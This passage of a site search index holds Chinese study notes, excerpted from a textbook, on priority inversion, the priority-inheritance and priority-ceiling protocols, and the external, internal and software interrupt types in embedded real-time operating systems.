\u7684\u6982\u5ff5\uff0c\u4e66\u4e2d\u6ca1\u6709\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u4e8e\u662f\u6211\u5728 \u5f97\u5230APP \u7684\u641c\u7d22\u5f15\u64ce\u4e2d\u8fdb\u884c\u4e86\u641c\u7d22\uff0c\u770b\u5230\u5218\u65ed\u660e\u8001\u5e08\u5199\u7684 \u300a\u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u539f\u7406\u4e0e\u6700\u4f73\u5b9e\u8df5\u300b \u4e2d\u8bb2\u5f97\u5f88\u6e05\u695a\uff0c\u4e8e\u662f\u6211\u628a\u539f\u6587\u6458\u5f55\u4e86\u4e0b\u6765\uff0c\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\uff0c\u7248\u6743\u5f52\u539f\u4f5c\u8005\u5218\u65ed\u660e\u8001\u5e08\u6240\u6709\u3002 2. \u4f18\u5148\u7ea7\u53cd\u8f6c # 2.1. \u4f18\u5148\u7ea7\u53cd\u8f6c # (Priority inversion) \u5728\u7cfb\u7edf\u4e2d\uff0c\u6709\u4e9b\u8d44\u6e90\u5fc5\u987b\u662f\u72ec\u5360\u4f7f\u7528\u7684\uff0c\u591a\u4e2a\u4efb\u52a1\u5bf9\u8fd9\u6837\u7684\u8d44\u6e90\u7684\u5e76\u53d1\u8bbf\u95ee\u5c06\u5bfc\u81f4\u9519\u8bef\u7684\u53d1\u751f\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u9700\u8981\u72ec\u5360\u4f7f\u7528\u7684\u8d44\u6e90\u5fc5\u987b\u4f7f\u7528\u4e92\u65a5\u65b9\u6cd5\u5c06\u5bf9\u5176\u7684\u5e76\u53d1\u8bbf\u95ee\u4e32\u884c\u5316 1 \u3002 \u5728\u4f18\u5148\u7ea7\u591a\u4efb\u52a1\u7cfb\u7edf\u4e2d\u5f15\u5165\u4e92\u65a5\u65b9\u6848\uff0c\u4f1a\u5bfc\u81f4\u4efb\u52a1\u4f18\u5148\u7ea7\u53cd\u8f6c\u7684\u95ee\u9898\uff1a\u5047\u5982\u67d0\u65f6\u4f4e\u4f18\u5148\u7ea7\u7684\u4efb\u52a1\u5360\u6709\u8d44\u6e90\uff0c\u7136\u540e\u53c8\u6709\u9ad8\u4f18\u5148\u7ea7\u7684\u4efb\u52a1\u7533\u8bf7\u8d44\u6e90\uff0c\u4f46\u56e0\u4e3a\u4e0d\u80fd\u6ee1\u8db3\u800c\u88ab\u6302\u8d77\u4e86\uff0c\u5373 \u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u963b\u585e\u4e86\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u7684\u8fd0\u884c \u3002\u5047\u5982\u8fd9\u65f6\u53c8\u6709\u4e00\u4e2a\u4e2d\u4f18\u5148\u7ea7\u4efb\u52a1\uff0c\u90a3\u4e48\u5b83\u4f1a\u628a\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u62a2\u5360\u3002\u6700\u7ec8\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u4f1a\u95f4\u63a5\u5730\u88ab\u4e2d\u4f18\u5148\u7ea7\u4efb\u52a1\u62a2\u5360\u4e86\u3002\u8fd9\u79cd\u73b0\u8c61\u53eb\u4f5c \u4f18\u5148\u7ea7\u53cd\u8f6c \u3002\u4e3e\u4f8b\u8bf4\u660e\uff1a \u5047\u5982A\u3001D\u3001C\u4e09\u4e2a\u4efb\u52a1\u4f18\u5148\u7ea7\u4ece\u9ad8\u5230\u4f4e\u6392\u5217\uff0c\u4efb\u52a1A\u548cC\u5171\u4eab\u4e92\u65a5\u4fe1\u53f7\u91cfR\uff0c\u5982\u679c\u67d0\u4e00\u65f6\u523b\u4efb\u52a1C\u5df2\u7ecf\u83b7\u5f97\u4e92\u65a5\u4fe1\u53f7\u91cfR\uff0c\u800c\u4efb\u52a1A\u6b64\u65f6\u5c1d\u8bd5\u5360\u7528R\uff0c\u90a3\u4e48\u4efb\u52a1A\u4f1a\u56e0\u4e3a\u5f97\u4e0d\u5230R\u800c\u963b\u585e\u5728R\u7684 \u4efb\u52a1\u7b49\u5f85\u961f\u5217 \u4e2d\u3002\u518d\u5047\u8bbe\u6b64\u65f6\u4efb\u52a1D\u56e0\u4e3a\u4f18\u5148\u7ea7\u9ad8\u4e8e\u4efb\u52a1C\u4ece\u800c\u62a2\u5360\u4e86C\uff0c\u8fdb\u800c\u957f\u671f\u5360\u6709\u5904\u7406\u5668\u8d44\u6e90\uff0c\u90a3\u4e48\u5c31\u76f8\u5f53\u4e8e\u4e2d\u4f18\u5148\u7ea7\u7684\u4efb\u52a1D\u95f4\u63a5\u963b\u585e\u4e86\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1A\u7684\u8fd0\u884c\u3002 \\text{Figure 1. \u4f18\u5148\u7ea7\u53cd\u8f6c} T0\u65f6\u523b\uff0c\u4efb\u52a1C\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\uff0c\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4efb\u52a1C\u83b7\u5f97\u4e86\u5171\u4eab\u8d44\u6e90R\u3002 T1\u65f6\u523b\uff0c\u4efb\u52a1A\u5c31\u7eea\u3002\u7531\u4e8e\u4efb\u52a1A\u4f18\u5148\u7ea7\u9ad8\u4e8e\u4efb\u52a1C\uff0c\u6240\u4ee5\u5b83\u62a2\u5360\u4e86\u4efb\u52a1C\uff0c\u4efb\u52a1A\u88ab\u8c03\u5ea6\u6267\u884c\u3002 T2\u65f6\u523b\uff0c\u4efb\u52a1A\u9700\u8981\u5171\u4eab\u8d44\u6e90R\uff0c\u4f46R\u88ab\u66f4\u4f4e\u4f18\u5148\u7ea7\u7684\u4efb\u52a1C\u6240\u62e5\u6709\uff0c\u6240\u4ee5\u4efb\u52a1A\u88ab\u963b\u585e\u7b49\u5f85\u8be5\u8d44\u6e90\u3002\u4efb\u52a1C\u5f97\u5230\u6267\u884c\u3002 T3\u65f6\u523b\uff0c\u6b64\u65f6\u4efb\u52a1D\u5c31\u7eea\uff0c\u7531\u4e8e\u4efb\u52a1D\u4f18\u5148\u7ea7\u9ad8\u4e8e\u4efb\u52a1C\uff0c\u6240\u4ee5\u5b83\u62a2\u5360\u4e86\u4efb\u52a1C\uff0c\u4efb\u52a1D\u88ab\u8c03\u5ea6\u6267\u884c\u3002 \u4ece\u6574\u4e2a\u6d41\u7a0b\u4e0a\u770b\uff0cT3\u65f6\u523b\uff0c\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1A\u88ab\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1D\u95f4\u63a5\u5730\u62a2\u5360\u4e86\u3002\u6b64\u65f6\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a1A\u4e0d\u4ec5\u8981\u7b49\u4efb\u52a1C\u8fd0\u884c\u5b8c\uff0c\u8fd8\u8981\u7b49\u4f18\u5148\u7ea7\u4f4e\u7684\u4efb\u52a1D\u8fd0\u884c\u5b8c\u624d\u80fd\u88ab\u8c03\u5ea6\uff0c\u5982\u679c\u4efb\u52a1D\u548c\u4efb\u52a1C\u9700\u8981\u6267\u884c\u5f88\u957f\u65f6\u95f4\uff0c\u90a3\u4e48\u4efb\u52a1A\u7684\u6267\u884c\u5c31\u4e0d\u80fd\u5f97\u5230\u4fdd\u8bc1\uff0c\u6574\u4e2a\u7cfb\u7edf\u7684\u5b9e\u65f6\u6027\u80fd\u5f88\u5dee\u3002 \u4f18\u5148\u7ea7\u53cd\u8f6c\u73b0\u8c61\u5bf9\u57fa\u4e8e\u4f18\u5148\u7ea7\u8c03\u5ea6\u7684\u5b9e\u65f6\u7cfb\u7edf\u6709\u5f88\u5927\u7684\u5f71\u54cd\u3002\u5728\u57fa\u4e8e\u4f18\u5148\u7ea7\u8c03\u5ea6\u7684\u7cfb\u7edf\u4e2d\uff0c\u5904\u7406\u5668\u8d44\u6e90\u662f\u6309\u7167\u4f18\u5148\u7ea7\u5206\u914d\u7ed9\u4efb\u52a1\u7684\uff0c\u5c31\u7eea\u7684\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u5fc5\u987b\u5b9e\u65f6\u83b7\u5f97\u5904\u7406\u5668\u3002\u7cfb\u7edf\u4e2d\u7684\u5404\u79cd\u8d44\u6e90\uff0c\u5982\u679c\u91c7\u7528\u6309\u7167\u4efb\u52a1\u4f18\u5148\u7ea7\u5206\u914d\u7684\u539f\u5219\uff0c\u90a3\u4e48\u9ad8\u4f18\u5148\u7ea7\u7684\u4efb\u52a1\u5e94\u8be5\u662f\u9996\u5148\u88ab\u8003\u8651\u7684\u3002\u4f18\u5148\u7ea7\u53cd\u8f6c\u7684\u95ee\u9898\u5c06\u6253\u4e71\u8fd9\u4e9b\u539f\u5219\u3002 2.2. \u4f18\u5148\u7ea7\u7ee7\u627f\u548c\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565 # \u4f18\u5148\u7ea7\u53cd\u8f6c\u95ee\u9898\u7684\u6838\u5fc3\u539f\u56e0\u5728\u4e8e\u5171\u4eab\u8d44\u6e90\u7684\u8bbf\u95ee\u89c4\u5219\uff0c\u5373\u5171\u4eab\u8d44\u6e90\u53ea\u80fd\u88ab\u4e00\u4e2a\u4efb\u52a1\u5360\u7528\uff0c\u88ab\u5360\u7528\u540e\u5176\u4ed6\u4efb\u52a1\u4e0d\u80fd\u5f3a\u5236\u4f7f\u7528\u8fd9\u4e2a\u8d44\u6e90\u3002\u5728\u4f18\u5148\u7ea7\u53cd\u8f6c\u95ee\u9898\u4e0a\uff0c\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u88ab\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u963b\u585e\u662f\u5fc5\u5b9a\u7684\uff0c\u4f46\u88ab\u4e2d\u4f18\u5148\u7ea7\u4efb\u52a1\u963b\u585e\u5219\u662f\u5f88\u65e0\u5948\u7684\u3002\u4e3a\u4e86\u907f\u514d\u56e0\u4e3a\u4e2d\u4f18\u5148\u7ea7\u4efb\u52a1\u631f\u6301\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u4ece\u800c\u963b\u585e\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u7684\u73b0\u8c61\uff0c\u53ef\u4ee5\u91c7\u7528\u4e00\u4e9b\u5fc5\u8981\u7684\u7b97\u6cd5\u3002 \u6709\u4e24\u79cd\u7ecf\u5178\u7684\u9632\u6b62\u4f18\u5148\u7ea7\u53cd\u8f6c\u7684\u7b97\u6cd5\uff1a \u4f18\u5148\u7ea7\u7ee7\u627f\u7b56\u7565\uff08Priority inheritance\uff09\uff1a\u5f53\u4e00\u4e2a\u4efb\u52a1\u5360\u6709\u4e86\u8d44\u6e90\u5e76\u4e14\u968f\u540e\u963b\u585e\u4e86\u5176\u4ed6\u7533\u8bf7\u8be5\u8d44\u6e90\u7684\u4efb\u52a1\u65f6\uff0c\u8be5\u4efb\u52a1\u5c06\u4e34\u65f6\u6539\u53d8\u5b83\u7684\u4f18\u5148\u7ea7\u4e3a\u6240\u6709\u7533\u8bf7\u8be5\u8d44\u6e90\u7684\u4efb\u52a1\u4e2d\u7684\u6700\u9ad8\u4f18\u5148\u7ea7\uff0c\u5e76\u4ee5\u8fd9\u4e2a\u4e34\u65f6\u4f18\u5148\u7ea7\u5728\u4e34\u754c\u533a\u6267\u884c\u3002\u5f53\u4efb\u52a1\u91ca\u653e\u8d44\u6e90\u540e\uff0c\u5219\u6062\u590d\u5b83\u539f\u6709\u7684\u4f18\u5148\u7ea7\u3002\u4ece\u884c\u4e3a\u4e0a\u770b\uff0c\u5360\u6709\u8d44\u6e90\u7684\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u5c06\u662f\u201c\u6c34\u6da8\u8239\u9ad8\u201d\u5f0f\u7684\u591a\u6b21\u6539\u53d8\uff0c\u56e0\u4e3a\u5b83\u7684\u4f18\u5148\u7ea7\u6700\u9ad8\uff0c\u6240\u4ee5\u5b83\u4e0d\u4f1a\u88ab\u66fe\u7ecf\u6bd4\u5b83\u4f18\u5148\u7ea7\u9ad8\u7684\u90a3\u4e9b\u4efb\u52a1\u62a2\u5360\u3002\u64cd\u4f5c\u7cfb\u7edf\u4ece\u4f18\u5148\u7ea7\u89d2\u5ea6\u5b89\u6392\u5b83\u5c3d\u5feb\u6267\u884c\uff0c\u5c3d\u5feb\u91ca\u653e\u8d44\u6e90\uff0c\u4f46\u662f\u8fd9\u6837\u505a\u64cd\u4f5c\u7cfb\u7edf\u5374\u727a\u7272\u4e86\u4e2d\u7b49\u4f18\u5148\u7ea7\u4efb\u52a1\u7684\u8c03\u5ea6\u673a\u4f1a\u3002 \u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565\uff08Priority ceilings\uff09\uff1a\u5c06\u7533\u8bf7\uff08\u5360\u6709\uff09\u8d44\u6e90\u7684\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u63d0\u5347\u5230\u53ef\u80fd\u8bbf\u95ee\u8be5\u8d44\u6e90\u7684\u6240\u6709\u4efb\u52a1\u7684\u6700\u9ad8\u4f18\u5148\u7ea7\uff08\u8fd9\u4e2a\u6700\u9ad8\u4f18\u5148\u7ea7\u79f0\u4e3a\u8be5\u8d44\u6e90\u7684\u4f18\u5148\u7ea7\u5929\u82b1\u677f\uff09\u3002 2.2.1. \u4f18\u5148\u7ea7\u7ee7\u627f # \\text{Figure 2. \u4f18\u5148\u7ea7\u7ee7\u627f\u7b56\u7565} \u521d\u59cb\u4f18\u5148\u7ea7\uff1a A > D > B > C \uff08\u4ece\u9ad8\u5230\u4f4e\u6392\u5e8f\uff09 T0\u65f6\u523b\uff0c\u53ea\u6709\u4efb\u52a1C\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\uff0c\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4efb\u52a1C\u5f97\u5230\u5171\u4eab\u8d44\u6e90R\u3002 T1\u65f6\u523b\uff0c\u4efb\u52a1B\u62a2\u5360\u4efb\u52a1C\uff0c\u5e76\u5c1d\u8bd5\u83b7\u5f97\u8d44\u6e90R\uff0c\u56e0\u4e3a\u4f18\u5148\u7ea7\u7ee7\u627f\u7684\u539f\u56e0\uff0c\u4efb\u52a1C\u7684\u4f18\u5148\u7ea7\u88ab\u63d0\u5347\u5230\u4efb\u52a1B\u7684\u4f18\u5148\u7ea7\uff1b\u4efb\u52a1B\u88ab\u963b\u585e\u3002 T2\u65f6\u523b\uff0c\u4efb\u52a1A\u62a2\u5360\u4efb\u52a1C\uff0c\u5e76\u5c1d\u8bd5\u83b7\u5f97\u8d44\u6e90R\uff0c\u56e0\u4e3a\u4f18\u5148\u7ea7\u7ee7\u627f\u7684\u539f\u56e0\uff0c\u4efb\u52a1C\u7684\u4f18\u5148\u7ea7\u88ab\u63d0\u5347\u5230\u4efb\u52a1A\u7684\u4f18\u5148\u7ea7\uff1b\u4efb\u52a1A\u88ab\u963b\u585e\u3002 \u5728Ta\u65f6\u523b\uff0c\u4efb\u52a1D\u5c31\u7eea\uff0c\u4f46\u56e0\u4e3a\u6b64\u65f6\u4efb\u52a1C\u7684\u4f18\u5148\u7ea7\u5df2\u7ecf\u88ab\u63d0\u5347\u5e76\u4e14\u6bd4\u4efb\u52a1D\u4f18\u5148\u7ea7\u9ad8\uff0c\u6240\u4ee5\u4efb\u52a1D\u4e0d\u80fd\u62a2\u5360\u4efb\u52a1C\uff0c\u4efb\u52a1C\u7ee7\u7eed\u8fd0\u884c\u3002 T3\u65f6\u523b\uff0c\u4efb\u52a1C\u91ca\u653e\u8d44\u6e90\uff0c\u5b83\u7684\u4f18\u5148\u7ea7\u6062\u590d\u5230\u539f\u6709\u4f18\u5148\u7ea7\u3002\u4efb\u52a1A\u5f97\u5230\u8d44\u6e90\uff0c\u5e76\u56e0\u4e3a\u4f18\u5148\u7ea7\u539f\u56e0\u62a2\u5360\u4efb\u52a1C\u3002 T4\u65f6\u523b\uff0c\u4efb\u52a1A\u91ca\u653e\u8d44\u6e90\uff0c\u7ed3\u675f\u8fd0\u884c\u3002\u4efb\u52a1B\u5f97\u5230\u8d44\u6e90\u3002\u4f46\u6b64\u65f6\u56e0\u4e3a\u4efb\u52a1D\u4f18\u5148\u7ea7\u9ad8\u4e8e\u4efb\u52a1B\uff0c\u6240\u4ee5\u4efb\u52a1D\u5f00\u59cb\u8fd0\u884c\u3002 T5\u65f6\u523b\uff0c\u4efb\u52a1D\u7ed3\u675f\u8fd0\u884c\uff0c\u4efb\u52a1B\u5f00\u59cb\u6267\u884c\u3002 2.2.2. \u4f18\u5148\u7ea7\u5929\u82b1\u677f # \\text{Figure 3. \u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565} T0\u65f6\u523b\uff0c\u53ea\u6709\u4efb\u52a1C\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u3002 T1\u65f6\u523b\uff0c\u4efb\u52a1C\u5f97\u5230\u5171\u4eab\u8d44\u6e90R\uff0c\u56e0\u4e3a\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565\u7684\u539f\u56e0\uff0c\u4efb\u52a1C\u7684\u4f18\u5148\u7ea7\u63d0\u5347\u5230\u5168\u90e8\u53ef\u80fd\u8bbf\u95ee\u8be5\u8d44\u6e90\u7684\u4efb\u52a1\u7684\u6700\u9ad8\u4f18\u5148\u7ea7\u3002 Ta\u65f6\u523b\uff0c\u4efb\u52a1A\u62a2\u5360\u4efb\u52a1C\u6267\u884c\uff0c\u968f\u540e\u5c1d\u8bd5\u83b7\u5f97\u8d44\u6e90R\uff0c\u4f46\u662f\u5931\u8d25\u5e76\u963b\u585e\u3002\u4efb\u52a1C\u7ee7\u7eed\u8fd0\u884c\u3002 Tb\u65f6\u523b\uff0c\u4efb\u52a1B\u5c31\u7eea\uff0c\u4f46\u662f\u56e0\u4e3a\u4efb\u52a1C\u4f18\u5148\u7ea7\u66f4\u9ad8\uff0c\u6240\u4ee5\u53ea\u80fd\u7b49\u5f85\u6267\u884c\u3002 T2\u65f6\u523b\u4efb\u52a1C\u91ca\u653e\u8d44\u6e90R\uff0c\u4efb\u52a1A\u5f97\u5230\u8d44\u6e90R\u3002\u56e0\u4e3a\u4f7f\u7528\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565\uff0c\u4efb\u52a1C\u4f18\u5148\u7ea7\u6062\u590d\u5230\u539f\u6709\u4f18\u5148\u7ea7\u3002\u4efb\u52a1A\u62a2\u5360\u4efb\u52a1C\u5f00\u59cb\u8fd0\u884c\u3002 T3\u65f6\u523b\uff0c\u4efb\u52a1A\u7ed3\u675f\u8fd0\u884c\u3002\u4efb\u52a1B\u5f00\u59cb\u8fd0\u884c\u3002 T4\u65f6\u523b\uff0c\u4efb\u52a1B\u7ed3\u675f\u8fd0\u884c\u3002\u4efb\u52a1C\u5f00\u59cb\u7ee7\u7eed\u8fd0\u884c\u3002 \u4f18\u5148\u7ea7\u7ee7\u627f\u7b56\u7565\u5bf9\u4efb\u52a1\u6267\u884c\u6d41\u7a0b\u7684\u5f71\u54cd\u76f8\u5bf9\u8f83\u5c0f\uff0c\u56e0\u4e3a\u53ea\u6709\u5f53\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u7533\u8bf7\u5df2\u88ab\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u5360\u6709\u7684\u5171\u4eab\u8d44\u6e90\u8fd9\u4e00\u4e8b\u5b9e\u53d1\u751f\u65f6\uff0c\u624d\u63d0\u5347\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u3002\u800c\u5929\u82b1\u677f\u7b56\u7565\u662f\u8c01\u5360\u6709\u5c31\u76f4\u63a5\u5347\u5230\u6700\u9ad8\u3002\u5f62\u8c61\u5730\u8bf4\uff0c\u4f18\u5148\u7ea7\u7ee7\u627f\u7b56\u7565\u662f\u201c\u6c34\u6da8\u8239\u9ad8\u201d\uff0c\u800c\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565\u5219\u662f\u201c\u4e00\u6b21\u5230\u4f4d\u201d\u3002 3. \u4e2d\u65ad\u673a\u5236 # \u4e2d\u65ad\u673a\u5236\u662f\u5904\u7406\u5668\u7684\u91cd\u8981\u57fa\u7840\u8bbe\u65bd\uff0c\u7528\u6765\u5e94\u5bf9\u5404\u79cd\u4e8b\u4ef6\u7684\u54cd\u5e94\u548c\u5904\u7406\u3002\u5f53\u5916\u8bbe\u6216\u8005\u5904\u7406\u5668\u81ea\u8eab\u6709\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u5904\u7406\u5668\u4f1a\u6682\u505c\u6267\u884c\u5f53\u524d\u7684\u4ee3\u7801\uff0c\u5e76\u8f6c\u5411\u5904\u7406\u8fd9\u4e9b\u4e2d\u65ad\u4e8b\u52a1\u3002\u5728\u5904\u7406\u5668\u4e0e\u5916\u8bbe\u95f4\u7684\u4ea4\u4e92\u5927\u591a\u91c7\u7528\u4e2d\u65ad\u6765\u5b8c\u6210\uff0c\u4e2d\u65ad\u7cfb\u7edf\u80fd\u6781\u5927\u63d0\u9ad8\u7cfb\u7edf\u7684\u6548\u7387\u3002 \u53d1\u51fa\u4e2d\u65ad\u8bf7\u6c42\u7684\u6765\u6e90\u53eb\u4f5c\u4e2d\u65ad\u6e90\u3002\u6839\u636e\u4e2d\u65ad\u6e90\u7684\u4e0d\u540c\uff0c\u53ef\u4ee5\u628a\u4e2d\u65ad\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b\uff1a 3.1. \u5916\u90e8\u4e2d\u65ad # \u5916\u90e8\u4e2d\u65ad\u662f\u6307\u7531\u7cfb\u7edf\u5916\u8bbe\u53d1\u51fa\u7684\u4e2d\u65ad\u8bf7\u6c42\uff0c\u5982\u4e32\u53e3\u6570\u636e\u7684\u63a5\u6536\u3001\u952e\u76d8\u7684\u6572\u51fb\u3001\u6253\u5370\u673a\u4e2d\u65ad\u3001\u5b9a\u65f6\u5668\u65f6\u95f4\u5230\u8fbe\u7b49\u3002\u5916\u90e8\u4e2d\u65ad\u5927\u591a\u662f\u53ef\u4ee5\u5c4f\u853d\u7684\uff0c\u7a0b\u5e8f\u53ef\u4ee5\u6839\u636e\u5177\u4f53\u9700\u8981\uff0c\u901a\u8fc7\u4e2d\u65ad\u63a7\u5236\u5668\u6765\u5c4f\u853d\u8fd9\u4e9b\u4e2d\u65ad\u8bf7\u6c42\u3002 3.2. \u5185\u90e8\u4e2d\u65ad # \u5185\u90e8\u4e2d\u65ad\u6307\u56e0\u5904\u7406\u5668\u81ea\u8eab\u7684\u539f\u56e0\u5f15\u8d77\u7684\u5f02\u5e38\u4e8b\u4ef6\uff0c\u5982\u975e\u6cd5\u6307\u4ee4\u3001\u603b\u7ebf\u9519\u8bef\uff08\u53d6\u6307\uff09\u6216\u8005\u8fd0\u7b97\u51fa\u9519\uff08\u96640\uff09\u7b49\u3002\u5185\u90e8\u4e2d\u65ad\u57fa\u672c\u662f\u4e0d\u53ef\u5c4f\u853d\u7684\u4e2d\u65ad\u3002 3.3. \u8f6f\u4ef6\u4e2d\u65ad # \u8f6f\u4ef6\u4e2d\u65ad\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u4e2d\u65ad\uff0c\u5b83\u662f\u7a0b\u5e8f\u901a\u8fc7\u8f6f\u4ef6\u6307\u4ee4\u89e6\u53d1\u7684\uff0c\u4ece\u800c\u4e3b\u52a8\u5f15\u8d77\u7a0b\u5e8f\u6d41\u7a0b\u7684\u53d8\u5316\u3002\u6bd4\u5982\u5728\u7528\u6237\u7ea7\u8fd0\u884c\u7684\u7a0b\u5e8f\u5728\u67d0\u65f6\u523b\u9700\u8981\u8bbf\u95ee\u5904\u7406\u5668\u4e2d\u53d7\u5230\u4fdd\u62a4\u7684\u5bc4\u5b58\u5668\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u8f6f\u4ef6\u4e2d\u65ad\u8fdb\u5165\u7cfb\u7edf\u7ea7\uff0c\u5b9e\u73b0\u6743\u9650\u7684\u63d0\u5347 1 \u3002 \u6ce8\uff1a\u7248\u6743\u5f52\u539f\u4f5c\u8005\u5218\u65ed\u660e\u8001\u5e08\u6240\u6709 4. \u53c2\u8003\u6587\u732e # \u5218\u65ed\u660e. \u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u539f\u7406\u4e0e\u6700\u4f73\u5b9e\u8df5. \u673a\u68b0\u5de5\u4e1a\u51fa\u7248\u793e, 2014. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.\u4f18\u5148\u7ea7\u53cd\u8f6c\u4e0e\u4e2d\u65ad\u673a\u5236"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#_1","text":"","title":"\u4f18\u5148\u7ea7\u53cd\u8f6c\u4e0e\u4e2d\u65ad\u673a\u5236"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#_2","text":"\u4f18\u5148\u7ea7\u53cd\u8f6c\u4e0e\u4e2d\u65ad\u673a\u5236 \u76ee\u5f55 1. \u80cc\u666f 2. \u4f18\u5148\u7ea7\u53cd\u8f6c 2.1. \u4f18\u5148\u7ea7\u53cd\u8f6c 2.2. \u4f18\u5148\u7ea7\u7ee7\u627f\u548c\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565 2.2.1. \u4f18\u5148\u7ea7\u7ee7\u627f 2.2.2. \u4f18\u5148\u7ea7\u5929\u82b1\u677f 3. \u4e2d\u65ad\u673a\u5236 3.1. \u5916\u90e8\u4e2d\u65ad 3.2. \u5185\u90e8\u4e2d\u65ad 3.3. \u8f6f\u4ef6\u4e2d\u65ad 4. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#1","text":"\u4eca\u5929\u770b \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u7684\u65f6\u5019\u5b66\u4e86 \u4f18\u5148\u7ea7\u53cd\u8f6c \u7684\u6982\u5ff5\uff0c\u4e66\u4e2d\u6ca1\u6709\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u4e8e\u662f\u6211\u5728 \u5f97\u5230APP \u7684\u641c\u7d22\u5f15\u64ce\u4e2d\u8fdb\u884c\u4e86\u641c\u7d22\uff0c\u770b\u5230\u5218\u65ed\u660e\u8001\u5e08\u5199\u7684 \u300a\u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u539f\u7406\u4e0e\u6700\u4f73\u5b9e\u8df5\u300b \u4e2d\u8bb2\u5f97\u5f88\u6e05\u695a\uff0c\u4e8e\u662f\u6211\u628a\u539f\u6587\u6458\u5f55\u4e86\u4e0b\u6765\uff0c\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\uff0c\u7248\u6743\u5f52\u539f\u4f5c\u8005\u5218\u65ed\u660e\u8001\u5e08\u6240\u6709\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#2","text":"","title":"2. \u4f18\u5148\u7ea7\u53cd\u8f6c"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#21","text":"(Priority inversion) 